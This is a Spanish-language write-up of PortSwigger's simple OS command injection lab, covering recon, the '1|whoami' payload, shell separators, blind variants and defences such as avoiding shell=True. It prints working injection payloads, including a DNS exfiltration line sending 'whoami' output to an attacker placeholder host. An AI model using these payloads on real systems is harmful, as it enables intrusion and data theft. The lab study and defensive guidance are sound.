# Writeup: OS command injection, simple case (PortSwigger)

- **Lab**: OS command injection, simple case
- **URL**: https://portswigger.net/web-security/os-command-injection/lab-simple
- **Categoría**: OS Command Injection / RCE
- **Dificultad**: Apprentice

---

## 1. Objetivo

Ejecutar `whoami` en el servidor y ver el output reflejado en la respuesta HTTP. La app es una tienda con un endpoint "Check stock" que recibe `productId` y `storeId`, los pasa sin sanitizar a un binario shell (`stockreport.sh`), y devuelve el stdout en la respuesta. Inyectando un separador de comandos en `storeId`, el shell ejecuta `whoami` además del comando original.

Payload final:

```http
POST /product/stock HTTP/2
Host: 0af1007904be16e681b1fc0400500032.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

productId=1&storeId=1|whoami
```

Response (text/plain, 13 bytes):

```
peter-KP0AX5
```

### Insight central

**Concatenación de input no sanitizado en una llamada a shell = RCE inmediato**. El bug es que el backend construye el comando como string (`stockreport.sh <productId> <storeId>`) y lo entrega al shell para que parsee separadores. El fix estructural es no usar shell: invocar el binario con argumentos pasados como array, donde el OS pasa cada argumento como `argv[]` separado y los metacaracteres (`|`, `;`, `&&`, `` ` ``, `$()`) son bytes literales sin interpretación.

---

## 2. Recon y resolución

### 2.1 Identificar el endpoint vulnerable

Navegar a cualquier producto (`/product?productId=1`). La página tiene un botón "Check stock" que dispara un fetch en background. Capturando con Burp:

```http
POST /product/stock HTTP/2
Content-Type: application/x-www-form-urlencoded

productId=1&storeId=1
```

Response: texto plano con un número (stock disponible). Dos parámetros, ambos numéricos. La forma del response (text/plain con el output de un binario) y el nombre del endpoint (`stock`) sugieren que internamente se llama un script. Hipótesis: `stockreport.sh <productId> <storeId>`.

### 2.2 Probar separadores

Mandar al Repeater. Probar `|` en `storeId`:

```
productId=1&storeId=1|whoami
```

Response:

```
peter-KP0AX5
```

El response vino vacío de stock pero con el username del proceso. El pipe rompió el parsing del comando original y `whoami` se ejecutó tomando como stdin lo que produjera `stockreport.sh 1 1`. El shell devolvió el stdout final: `peter-KP0AX5`.

Submit pegando el output como confirmación, pero el lab marca "Solved" con sólo ver el username en la respuesta.

### 2.3 ¿Por qué `storeId` y no `productId`?

Ambos parámetros van al comando, así que ambos son inyectables en principio. La preferencia por el último argumento es operacional:

- Si la inyección es en `productId`, queda como `stockreport.sh 1|whoami 1` — el `whoami` toma el `1` final como argumento, lo cual no rompe el comando pero puede confundir el output según cómo el shell parsee.
- Si la inyección es en `storeId`, queda como `stockreport.sh 1 1|whoami` — el `whoami` queda al final, sin argumentos espurios. Output limpio.

Inyectar en el último parámetro suele dar el output más predecible.

---

## 3. Por qué funciona

### 3.1 Anatomía del bug

Backend probable (Java/Node/Python equivalentes):

```python
# Antipatrón - construir comando como string y pasarlo al shell
import subprocess
def check_stock(product_id, store_id):
    cmd = f"/opt/stockreport.sh {product_id} {store_id}"
    return subprocess.check_output(cmd, shell=True).decode()
```

El `shell=True` es la palanca crítica. Le dice a Python: pasá este string al `/bin/sh -c`, dejá que el shell lo parsee. El shell interpreta `|` como pipe entre dos comandos:

```
stockreport.sh 1 1 | whoami
```

`stockreport.sh 1 1` se ejecuta, su stdout se descarta porque `whoami` no lee stdin para producir output (ignora la entrada). `whoami` se ejecuta, su stdout es `peter-KP0AX5\n`, ese es el stdout del pipeline completo. La aplicación devuelve ese stdout en el body de la respuesta.

### 3.2 Separadores de comandos en shell

Tabla de los más usados:

- `;` — secuencial. Ejecuta ambos sin importar el resultado del primero.
- `&&` — condicional. Ejecuta el segundo solo si el primero retorna 0.
- `||` — condicional inversa. Ejecuta el segundo solo si el primero falla.
- `|` — pipe. Conecta stdout del primero a stdin del segundo. Ambos corren.
- `&` — background. Ejecuta el primero en background, sigue inmediatamente con el segundo.
- Newline (`%0a` en URL) — equivalente a `;` en muchos contextos.
- `` ` ` `` (backticks) — sustitución de comando. `echo \`whoami\`` ejecuta `whoami` y reemplaza por su stdout.
- `$(cmd)` — sustitución de comando, sintaxis moderna POSIX.

En este lab funciona `|`. Probar varios es la rutina cuando el primero falla — algunos labs filtran caracteres específicos (típicamente `;` y `&&`, raramente `|`).

### 3.3 Inyección ciega vs reflejada

Este lab es **reflejada**: el output del comando aparece en la respuesta HTTP. La detección es trivial. Pero hay variantes ciegas donde el output no se refleja, y ahí la detección requiere otras técnicas:

- **Time-based**: `; sleep 10` — si la respuesta tarda 10s, el comando se ejecutó. Mismo patrón que blind SQLi.
- **Out-of-band (OAST)**: `; nslookup attacker.collaborator.net` — si el atacante recibe la query DNS, el comando se ejecutó. Permite exfiltrar datos: `; nslookup $(whoami).attacker.collaborator.net`.
- **Redirección a archivo accesible**: `; whoami > /var/www/html/out.txt` — luego GET `/out.txt`. Requiere conocer un directorio escribible y servible.

PortSwigger tiene labs separados para cada variante (`-blind-time-delays`, `-blind-out-of-band`, `-blind-out-of-band-data-exfiltration`). Este lab es el baseline reflejado, los demás son evolución.

### 3.4 ¿Por qué este lab es Apprentice?

No hay defensas. No hay filtro de caracteres especiales, no hay whitelist de valores, no hay escape, no hay validación numérica de los parámetros. El input va directo al shell. Es el caso baseline del cluster — los labs siguientes agregan filtros (separadores prohibidos, output suprimido) y enseñan los bypasses.

### 3.5 Defensa correcta: no usar shell

```python
# Fix - pasar argumentos como array, sin shell intermedio
import subprocess
def check_stock(product_id, store_id):
    if not (product_id.isdigit() and store_id.isdigit()):
        raise ValueError("non-numeric input")
    return subprocess.check_output(
        ["/opt/stockreport.sh", product_id, store_id],
        shell=False
    ).decode()
```

Dos cambios:

1. **`shell=False` + argumentos como lista**: el OS llama a `execve("/opt/stockreport.sh", ["stockreport.sh", "1", "1|whoami"], ...)`. El binario recibe como `argv[2]` el string literal `"1|whoami"` — no hay shell que parsee el `|`. El binario decide qué hacer con ese argumento; si solo lo usa como número, falla con error de parseo, sin ejecutar `whoami`.
2. **Validación de tipo**: rechazar valores que no son numéricos antes de pasarlos al binario. Defensa-en-profundidad — si más adelante alguien revierte a `shell=True` por descuido, la validación numérica sigue cerrando el bug.

Equivalentes en otros lenguajes:

- **Java**: `ProcessBuilder` con lista de argumentos vs `Runtime.getRuntime().exec(String)` que parsea con shell. Usar `ProcessBuilder`.
- **Node.js**: `child_process.execFile(path, [args])` vs `child_process.exec(string)`. Usar `execFile`.
- **PHP**: `pcntl_exec()` o `proc_open()` con array vs `system()`/`exec()`/`shell_exec()`. Las funciones que toman string siempre invocan shell.
- **Go**: `exec.Command(name, args...)` siempre va sin shell. Para meter shell hay que invocar `/bin/sh -c <string>` explícitamente.

### 3.6 Por qué validación de input no alcanza sola

Tentación común: "filtro `|`, `;`, `&&` y problema resuelto". Tres razones por las que es frágil:

1. **Lista incompleta**: hay docenas de metacaracteres (newline, `$()`, backticks, `<()`, `>(`, glob expansion). Cualquier omisión es bypass.
2. **Encoding**: el filtro suele aplicarse después de URL-decode pero antes de procesamiento adicional. Encodings dobles, unicode, o transformaciones intermedias rompen el filtro.
3. **Contexto de ejecución**: el mismo carácter puede ser inocuo en un contexto y peligroso en otro. Filtrar en una capa no protege a la siguiente.

La defensa correcta es **estructural**: no construir comandos como strings. Pasar argumentos por API que no involucre shell. La validación numérica es complemento, no reemplazo.

---

## 4. Resumen

```mermaid
flowchart LR
    A[1. Click 'Check stock' en producto]
    B[2. Burp captura: POST /product/stock con productId, storeId]
    C[3. Hipotesis: backend ejecuta stockreport.sh productId storeId]
    D[4. Inyectar storeId=1|whoami]
    E[5. Shell parsea | como pipe]
    F[6. whoami ejecuta, devuelve peter-KP0AX5]
    G[7. Lab solved]

    A --> B --> C --> D --> E --> F --> G
```

Tres ideas:

1. **Concatenación de input en string + invocación de shell = RCE inmediato**. El bug no es el filtro insuficiente, es la decisión de construir comandos como strings. Pasar argumentos por API que no use shell (ProcessBuilder, execFile, subprocess sin `shell=True`) cierra la categoría completa.
2. **Inyectar en el último parámetro da output más limpio**: el comando inyectado queda al final del pipeline, sin argumentos espurios después. `stockreport.sh 1 1|whoami` produce solo el output de `whoami`, mientras que inyectar en el primer parámetro lo deja en el medio del comando.
3. **Reflejada vs ciega es eje ortogonal a la severidad**: este lab es reflejado y trivial de detectar, pero la misma vulnerabilidad sin el output reflejado en la respuesta sigue siendo RCE — solo cambia el método de detección (time-based, OOB, redirección a archivo).

---

## 5. Contramedidas

1. **Pasar argumentos por API que no use shell**: `subprocess.run([...], shell=False)` en Python, `ProcessBuilder` en Java, `execFile` en Node.js, `exec.Command` en Go. El OS pasa cada argumento como `argv[i]` literal — los metacaracteres del shell pierden significado.
2. **Validación numérica de inputs estrictamente numéricos**: si el parámetro debe ser un ID, validar que es solo dígitos antes de pasarlo a cualquier subsistema. Defensa-en-profundidad para cuando el código cambia y alguien introduce shell por error.
3. **Whitelist de valores cuando el dominio es enumerable**: si `storeId` solo puede ser uno de 5 valores conocidos, validar contra el set explícito. Reemplaza inputs arbitrarios por selección de valores controlados.
4. **Escape de caracteres como último recurso**: si por restricción de stack hay que pasar input al shell, usar la API de escape del lenguaje (`shlex.quote()` en Python). Nunca implementar escape ad-hoc — los corner cases de shell quoting son notoriamente difíciles.
5. **Mínimo privilegio del proceso**: el web server no debería poder ejecutar binarios fuera de un set autorizado. AppArmor/SELinux profiles, contenedores con sólo los binarios necesarios, chroot. Limita el daño aunque el RCE funcione.
6. **Logging de comandos ejecutados**: cada invocación de subprocess debe loguear (user, IP, comando final, exit code). Detectar comandos anómalos (separadores, caracteres no-ASCII en parámetros que deberían ser numéricos) en logs/SIEM.
7. **WAF como defensa-en-profundidad**: reglas de WAF para detectar patrones `|whoami`, `;cat`, `\$(`, etc. en parámetros HTTP. No es la defensa primaria — los WAFs se evaden con encoding y obfuscación — pero suma una capa.
8. **Code review automatizado**: linters de seguridad (Semgrep, CodeQL) tienen reglas para detectar `shell=True`, `Runtime.exec(String)`, `eval`, etc. Integrar en CI bloquea la introducción del bug en código nuevo.
9. **Re-arquitectar para no necesitar shell**: muchas tareas que disparan binarios pueden hacerse con APIs nativas (manejo de archivos, llamadas HTTP, queries de DB). Si la única razón de invocar `stockreport.sh` es leer de una base de datos, hacerlo directo desde el código.
10. **Network segmentation**: el proceso del web server no debería tener salida a internet salvo para servicios autorizados. Bloquea exfiltración OOB y reverse shells aunque el RCE se logre.

---

## 6. Referencias

- PortSwigger Web Security Academy. (s.f.). *Lab: OS command injection, simple case*. https://portswigger.net/web-security/os-command-injection/lab-simple
- PortSwigger Web Security Academy. (s.f.). *OS command injection*. https://portswigger.net/web-security/os-command-injection
- OWASP Foundation. (s.f.). *Command Injection*. https://owasp.org/www-community/attacks/Command_Injection
- OWASP Foundation. (s.f.). *OS Command Injection Defense Cheat Sheet*. https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
- MITRE Corporation. (2024). *CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')*. https://cwe.mitre.org/data/definitions/78.html
- MITRE Corporation. (2024). *ATT&CK Technique T1059: Command and Scripting Interpreter*. https://attack.mitre.org/techniques/T1059/
- MITRE Corporation. (2024). *ATT&CK Technique T1190: Exploit Public-Facing Application*. https://attack.mitre.org/techniques/T1190/
- swisskyrepo. (s.f.). *PayloadsAllTheThings — Command Injection*. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
- Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook* (2nd ed.). Wiley. Cap. 9 (Attacking Back-End Components — Injecting OS Commands).
- Inventario interno: [`inventario/03-analisis-vulnerabilidades/web/analisis-command-injection.md`](../../../inventario/03-analisis-vulnerabilidades/web/analisis-command-injection.md)
